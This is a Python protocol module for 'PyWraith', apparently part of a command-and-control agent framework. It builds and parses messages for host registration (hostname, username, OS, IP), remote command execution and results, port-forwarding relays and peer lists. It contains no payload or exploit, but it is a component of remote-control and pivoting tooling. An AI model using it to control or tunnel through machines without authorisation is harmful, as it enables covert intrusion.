"""PyWraith protocol handling - protobuf encode/decode and message helpers."""

import struct
import time
import uuid
from typing import Optional, Dict, Any

from PyWraith.proto_gen import wraith_pb2 as pb


class WraithProtocol:
    """Pure protocol handling - no I/O, no session management."""

    @staticmethod
    def encode_message(msg: pb.WraithMessage) -> bytes:
        """Encode a protobuf message with 4-byte length prefix (big-endian)."""
        data = msg.SerializeToString()
        return struct.pack('>I', len(data)) + data

    @staticmethod
    def decode_message(data: bytes) -> pb.WraithMessage:
        """Decode a protobuf message from raw bytes."""
        msg = pb.WraithMessage()
        msg.ParseFromString(data)
        return msg

    @staticmethod
    def read_frame(sock) -> Optional[bytes]:
        """Read a length-prefixed frame from a blocking socket."""
        try:
            len_data = sock.recv(4)
            if not len_data or len(len_data) < 4:
                return None

            msg_len = struct.unpack('>I', len_data)[0]
            data = b''
            while len(data) < msg_len:
                chunk = sock.recv(msg_len - len(data))
                if not chunk:
                    return None
                data += chunk

            return data
        except Exception:
            return None

    @staticmethod
    def create_command(
        command_id: str,
        action: str,
        params: Optional[Dict[str, str]] = None,
        timeout: int = 30,
        target_wraith_id: str = ""
    ) -> pb.WraithMessage:
        """Create a COMMAND message."""
        cmd = pb.Command(
            command_id=command_id,
            action=action,
            params=params or {},
            timeout=timeout
        )
        msg = pb.WraithMessage(
            msg_type=pb.COMMAND,
            message_id=command_id,
            timestamp=int(time.time() * 1000),
            target_wraith_id=target_wraith_id,
            command=cmd
        )
        return msg

    @staticmethod
    def create_command_result(
        command_id: str,
        status: str,
        output: str = '',
        exit_code: int = 0,
        duration_ms: int = 0,
        error: str = ''
    ) -> pb.WraithMessage:
        """Create a COMMAND_RESULT message."""
        result = pb.CommandResult(
            command_id=command_id,
            status=status,
            output=output,
            exit_code=exit_code,
            duration_ms=duration_ms,
            error=error
        )
        msg = pb.WraithMessage(
            msg_type=pb.COMMAND_RESULT,
            message_id=command_id,
            timestamp=int(time.time() * 1000),
            result=result
        )
        return msg

    @staticmethod
    def create_registration(
        hostname: str,
        username: str,
        os: str,
        ip_address: str
    ) -> pb.WraithMessage:
        """Create REGISTRATION message."""
        registration = pb.Registration(
            hostname=hostname,
            username=username,
            os=os,
            ip_address=ip_address
        )
        msg = pb.WraithMessage(
            msg_type=pb.REGISTRATION,
            message_id=str(uuid.uuid4()),
            timestamp=int(time.time() * 1000),
            registration=registration
        )
        return msg

    @staticmethod
    def create_relay_command(
        command_id: str,
        listen_host: str,
        listen_port: int,
        listen_protocol: str,
        forward_host: str,
        forward_port: int,
        forward_protocol: str,
        timeout: int = 30
    ) -> pb.WraithMessage:
        """Create a relay command with independent listen/forward protocols.

        Args:
            command_id: Unique command identifier
            listen_host: Host to bind for listening
            listen_port: Port to bind for listening
            listen_protocol: "tcp" or "udp"
            forward_host: Host to forward connections to
            forward_port: Port to forward connections to
            forward_protocol: "tcp" or "udp"
            timeout: Command timeout in seconds

        Returns:
            pb.WraithMessage with RELAY_CREATE payload
        """
        msg = pb.WraithMessage()
        msg.msg_type = pb.RELAY_CREATE
        msg.message_id = command_id
        msg.timestamp = int(time.time() * 1000)

        relay_create = pb.RelayCreate()
        relay_create.relay_id = str(uuid.uuid4())

        # Set listen endpoint
        relay_create.config.listen.host = listen_host
        relay_create.config.listen.port = listen_port
        relay_create.config.listen.protocol = listen_protocol

        # Set forward endpoint
        relay_create.config.forward.host = forward_host
        relay_create.config.forward.port = forward_port
        relay_create.config.forward.protocol = forward_protocol

        msg.relay_create.CopyFrom(relay_create)
        return msg

    @staticmethod
    def parse_command_result(msg: pb.WraithMessage) -> Dict[str, Any]:
        """Extract command result fields as a dict."""
        result = msg.result
        return {
            'command_id': result.command_id,
            'status': result.status,
            'output': result.output,
            'exit_code': result.exit_code,
            'duration_ms': result.duration_ms,
            'error': result.error,
            'message_id': msg.message_id,
            'timestamp': msg.timestamp,
        }

    @staticmethod
    def create_wraith_registration(
        wraith_id: str,
        hostname: str,
        os: str
    ) -> pb.WraithMessage:
        """Create WRAITH_REGISTRATION message for peer connections."""
        reg = pb.WraithRegistration(
            wraith_id=wraith_id,
            hostname=hostname,
            os=os,
            connected_at=int(time.time() * 1000)
        )
        msg = pb.WraithMessage(
            msg_type=pb.WRAITH_REGISTRATION,
            message_id=str(uuid.uuid4()),
            timestamp=int(time.time() * 1000),
            wraith_registration=reg
        )
        return msg

    @staticmethod
    def create_peer_list() -> pb.WraithMessage:
        """Create PEER_LIST message."""
        msg = pb.WraithMessage(
            msg_type=pb.PEER_LIST,
            message_id=str(uuid.uuid4()),
            timestamp=int(time.time() * 1000),
            peer_list=pb.PeerList()
        )
        return msg

    @staticmethod
    def parse_peer_update(msg: pb.WraithMessage) -> Dict[str, Any]:
        """Extract peer update fields as a dict."""
        update = msg.peer_update
        return {
            'wraith_id': update.wraith_id,
            'hostname': update.hostname,
            'action': update.action,
            'timestamp': update.timestamp,
        }

    @staticmethod
    def parse_peer_list_response(msg: pb.WraithMessage) -> Dict[str, Any]:
        """Extract peer list response as a dict."""
        resp = msg.peer_list_response
        return {
            'wraith_id': resp.wraith_id,
            'peers': [{'wraith_id': p.wraith_id, 'hostname': p.hostname, 'connected': p.connected}
                      for p in resp.peers],
        }